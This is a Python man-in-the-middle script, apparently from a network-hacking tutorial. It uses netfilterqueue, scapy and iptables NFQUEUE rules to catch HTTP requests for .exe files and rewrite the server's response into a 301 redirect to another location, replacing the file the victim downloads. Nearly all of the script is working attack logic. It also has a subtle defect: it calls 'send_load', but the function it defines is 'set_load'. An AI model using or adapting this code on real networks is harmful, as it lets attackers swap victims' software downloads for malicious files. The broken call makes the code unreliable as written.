#!/usr/bin/env python

# "Exception IndexError: IndexError('Layer [TCP] not found',) in 'netfilterqueue.global_callback' ignored"
# replace – if scapy_packet.haslayer(scapy.Raw):
# with – if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:

# run >> iptables -I FORWARD -j NFQUEUE --queue-num 0
# run >> iptables -I OUTPUT -j NFQUEUE --queue-num 0
# run >> iptables -I INPUT -j NFQUEUE --queue-num 0
# reset with >> iptables --flush

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Rplacing Files")
         
                modified_packet = send_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

